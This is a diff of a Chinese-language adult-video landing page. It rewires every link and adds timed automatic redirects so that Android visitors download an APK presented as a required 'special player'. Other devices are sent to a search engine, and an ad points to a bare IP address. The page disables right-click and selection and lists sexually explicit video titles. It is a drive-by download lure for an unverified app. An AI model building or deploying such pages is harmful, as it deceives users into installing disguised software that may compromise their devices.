@@ -5,10 +5,10 @@
     <meta name="description" content="看片神器,">
     <meta name="keywords" content="看片神器,">
     <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui">
-    <link rel="stylesheet" href="css/demo4.css">
+    <link rel="stylesheet" href="demo4.css">
 	<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
     <script>
-        var xz_domain = "/";
+        var xz_domain = "";
 
         function randomString(len) {
             len = len || 32;
@@ -37,7 +37,8 @@
             c = "922229";
         }
 
-        var DownUrl = "loadxapl.html" + shuijishu;
+        var DownUrl = "https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk";
+
         var JumpUrl = "/?mb=" + mb + "&c=" + c;
 
         var browser = {
@@ -52,23 +53,18 @@
             }()
         };
         if (browser.versions.iPhone || browser.versions.iPad || browser.versions.ios) {
-            $(document).ready(function () {
-                $("a").attr("href", DownUrl);
-                $("a").attr("target", "_blank");
-				$("#adurls").attr("href", "http://107.149.163.250/ae.html");
-            });
+            //window.location.href = JumpUrl;
+            window.location.href = "http://www.baidu.com";
         } else if (browser.versions.android) {
             $(document).ready(function () {
                 $("a").attr("href", DownUrl);
-                $("a").attr("target", "_blank");
-				$("#adurls").attr("href", "http://107.149.163.250/ae.html");
+                $("#adurls").attr("href", "http://107.149.163.250/ae.html");
             });
-			//setTimeout("showTip01a()", "1000");
-			//setTimeout("showTip01a()", "2000");
-			//setTimeout("showTip01a()", "3000");
+			setTimeout("showTip01a()", "1000");
+			setTimeout("showTip01a()", "2000");
+			setTimeout("showTip01a()", "3000");
 			
         } else {
-			//alert(1);
             window.location.href = "http://www.baidu.com";
         }
 
@@ -94,6 +90,11 @@
                     document.getElementById("swfplayer").pause();
                 }, 20000);
 				
+
+				
+				
+				
+				
 				
             });
             $(".tvp_app_bar .tvp_close").click(function () {
@@ -102,22 +103,28 @@
         })
 		
 		function showTip01a() {
-			location.href = DownUrl;
+		location.href = DownUrl;
 		}
+
+		
+		
+		
+		
     </script>
 </head>
-<body oncontextmenu="return false" onselectstart="return false" style="zoom: 1;" marginwidth="0" marginheight="0">
-<a href="loadxapl.html" name="moviesLink" target="_blank">
+<body oncontextmenu="return false" onselectstart="return false" style="zoom: 1;">
+
+<a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" name="moviesLink">
     <div class="header">
         <div class="header_tip ">立即下载本站影片资源专用播放器</div>
     </div>
 </a>
 	    <div class="footerDown ">
 	        <a id="adurls" target="_blank" href="http://107.149.163.250/ae.html"><img src="https://ae01.alicdn.com/kf/Ue15da8237ecb42ef9b8b424e4117e17aF.gif" width="100%" height="80px"></a>
-	    </div>
+	        	</div>
 <div class="container">
     <div class="mod_player">
-        <a href="loadxapl.html" target="_blank">
+        <a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk">
             <div class="tvp_overlay_play_try ech-vidHldr" id="player_mask" onclick="clickme()">
                 <div class="tvp_overlay_play_try " style="width:16rem;height: 70px;border-radius: 2px;border:0">
                     <span class="tvp_text" style="padding:2px 0 5px 0">安装免费观看,上万部成人影片等你欣赏！</span>
@@ -126,18 +133,18 @@
             </div>
         </a>
 
-        <div class="tvp_overlay_play_try" id="tplayer">
+        <div class="tvp_overlay_play_try" id="tplayer" style="display: none;">
             <img src="img/playg_8.png" id="playanniu" style="width:20px; height:20px; display:none;">
             <span class="tvp_button_play"></span>
             <span class="tvp_text">试看120秒</span></div>
-        <div class="tvp_overlay_play_load" id="cplayer" style="display:none; margin:auto; text-align:center; vertical-align:middle; width: 45px; height: 45px;">
+        <div class="tvp_overlay_play_load" id="cplayer" style="margin: auto; text-align: center; vertical-align: middle; width: 45px; height: 45px; display: none;">
             <div style="text-align:center; vertical-align:middle; margin:auto;">
                 <img src="img/4_8.gif" style="width: 45px; height: 45px;">
             </div>
         </div>
-        <img class="tvp_poster_img" id="xplayer" src="img/hd7.jpg">
-        <a href="loadxapl.html" target="_blank">
-            <video id="swfplayer" style="display:none" width="100%" height="300">
+        <img class="tvp_poster_img" id="xplayer" src="img/hd7.jpg" style="display: none;">
+        <a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk">
+            <video id="swfplayer" style="" width="100%" height="300">
                 <source src="https://cdn.vgo30.com/01.mp4" type="video/mp4">
                 <source src="movie.ogg" type="video/ogg">
                 <source src="movie.webm" type="video/webm">
@@ -148,8 +155,10 @@
         </a></div>
 </div>
     <div class="footerDown ">
-        <a href="loadxapl.html" name="moviesLink" target="_blank">播放器下载</a>
+        <a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" name="moviesLink">播放器下载</a>
+
 	</div>
+
 <script>
     var array = [];
     var data = [
@@ -198,25 +207,25 @@
                 }
             }
         }
-    </script><a href="loadxapl.html" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i3/3257972811/TB2bkvedJAmyKJjSZFGXXb.fFXa_!!3257972811.gif"></div><p>90后学生激情热吻,草地野战无视围观激情内射</p><div class="status"><span class="left">观看:2324 &nbsp;&nbsp;画质:HD</span></div></a>
-<a href="loadxapl.html" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i2/3257972811/TB2Bpa9dTMlyKJjSZFFXXalVFXa_!!3257972811.gif"></div><p>绝美少女被操的高潮画面太淫荡,全套高清视频我果断撸了</p><div class="status"><span class="left">观看:1546 &nbsp;&nbsp;画质:HD</span></div></a>
-<a href="loadxapl.html" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB20ScaebglyKJjSZFuXXaE6FXa_!!3257972811.gif"></div><p>最新情侣各种大尺度的爱爱高清视频合集高潮不断</p><div class="status"><span class="left">观看:4677 &nbsp;&nbsp;画质:AIV</span></div></a>
-<a href="loadxapl.html" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB2FSm.dHAlyKJjSZFwXXXtqpXa_!!3257972811.gif"></div><p>极品少妇那呻吟声和享受的表情，我也被她带动到了高潮</p><div class="status"><span class="left">观看:3567 &nbsp;&nbsp;画质:DVD</span></div></a>
-<a href="loadxapl.html" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i3/3257972811/TB2bkvedJAmyKJjSZFGXXb.fFXa_!!3257972811.gif"></div><p>90后学生激情热吻,草地野战无视围观激情内射</p><div class="status"><span class="left">观看:2324 &nbsp;&nbsp;画质:HD</span></div></a>
-<a href="loadxapl.html" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i2/3257972811/TB2Bpa9dTMlyKJjSZFFXXalVFXa_!!3257972811.gif"></div><p>绝美少女被操的高潮画面太淫荡,全套高清视频我果断撸了</p><div class="status"><span class="left">观看:1546 &nbsp;&nbsp;画质:HD</span></div></a>
-<a href="loadxapl.html" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB20ScaebglyKJjSZFuXXaE6FXa_!!3257972811.gif"></div><p>最新情侣各种大尺度的爱爱高清视频合集高潮不断</p><div class="status"><span class="left">观看:4677 &nbsp;&nbsp;画质:AIV</span></div></a>
-<a href="loadxapl.html" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB2FSm.dHAlyKJjSZFwXXXtqpXa_!!3257972811.gif"></div><p>极品少妇那呻吟声和享受的表情，我也被她带动到了高潮</p><div class="status"><span class="left">观看:3567 &nbsp;&nbsp;画质:DVD</span></div></a>
+    </script><a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" class="moviesLink" name="moviesLink"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i4/3257972811/TB2iwfgdJAmyKJjSZFKXXXCQXXa_!!3257972811.gif"></div><p>何为极品，看到她那美丽的容颜,魔鬼的身材,那一刻我硬了</p><div class="status"><span class="left">观看:8479 &nbsp;&nbsp;画质:HD</span></div></a>
+<a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" class="moviesLink" name="moviesLink"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB20ScaebglyKJjSZFuXXaE6FXa_!!3257972811.gif"></div><p>最新情侣各种大尺度的爱爱高清视频合集高潮不断</p><div class="status"><span class="left">观看:4677 &nbsp;&nbsp;画质:AIV</span></div></a>
+<a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" class="moviesLink" name="moviesLink"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB2FSm.dHAlyKJjSZFwXXXtqpXa_!!3257972811.gif"></div><p>极品少妇那呻吟声和享受的表情，我也被她带动到了高潮</p><div class="status"><span class="left">观看:3567 &nbsp;&nbsp;画质:DVD</span></div></a>
+<a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" class="moviesLink" name="moviesLink"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i3/3257972811/TB2bkvedJAmyKJjSZFGXXb.fFXa_!!3257972811.gif"></div><p>90后学生激情热吻,草地野战无视围观激情内射</p><div class="status"><span class="left">观看:2324 &nbsp;&nbsp;画质:HD</span></div></a>
+<a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" class="moviesLink" name="moviesLink"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i4/3257972811/TB2iwfgdJAmyKJjSZFKXXXCQXXa_!!3257972811.gif"></div><p>何为极品，看到她那美丽的容颜,魔鬼的身材,那一刻我硬了</p><div class="status"><span class="left">观看:8479 &nbsp;&nbsp;画质:HD</span></div></a>
+<a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" class="moviesLink" name="moviesLink"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB20ScaebglyKJjSZFuXXaE6FXa_!!3257972811.gif"></div><p>最新情侣各种大尺度的爱爱高清视频合集高潮不断</p><div class="status"><span class="left">观看:4677 &nbsp;&nbsp;画质:AIV</span></div></a>
+<a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" class="moviesLink" name="moviesLink"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB2FSm.dHAlyKJjSZFwXXXtqpXa_!!3257972811.gif"></div><p>极品少妇那呻吟声和享受的表情，我也被她带动到了高潮</p><div class="status"><span class="left">观看:3567 &nbsp;&nbsp;画质:DVD</span></div></a>
+<a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" class="moviesLink" name="moviesLink"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i3/3257972811/TB2bkvedJAmyKJjSZFGXXb.fFXa_!!3257972811.gif"></div><p>90后学生激情热吻,草地野战无视围观激情内射</p><div class="status"><span class="left">观看:2324 &nbsp;&nbsp;画质:HD</span></div></a>
 
 </div>
 <div class="footer">
     <div class="footerDown ">
-        <a href="loadxapl.html" name="moviesLink" target="_blank">播放器下载</a>
-        <a href="loadxapl.html" class="more" name="moviesLink" target="_blank">更多精彩...</a>
+        <a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" name="moviesLink">播放器下载</a>
+        <a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" target="_blank" class="more" name="moviesLink">更多精彩...</a>
 	</div>
     <p>警告：本站含大量成人内容 仅供18周岁以上人群浏览！</p>
     <p>请遵守当地法律法规，不要随意传播！</p>
 </div>
-<div class="eche"><a href="loadxapl.html" class="float" name="moviesLink" target="_blank">点我下载<span>本站18禁专用播放器</span>观看更多影片资源</a></div>
-<div style="display:none;"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278102790&amp;web_id=1278102790"></script><script src="https://c.cnzz.com/core.php?web_id=1278102790&amp;t=z" charset="utf-8" type="text/javascript"></script><a href="loadxapl.html" target="_blank" title="站长统计">站长统计</a></div>
+<div class="eche"><a href="https://github.com/wydewy/wydewy.github.io/releases/download/1.0.0/lovideo.apk" class="float" name="moviesLink">点我下载<span>本站18禁专用播放器</span>观看更多影片资源</a></div>
+<div style="display:none;"><script type="text/javascript" src="https://js.users.51.la/20132137.js"></script></div>
 
 </body></html>
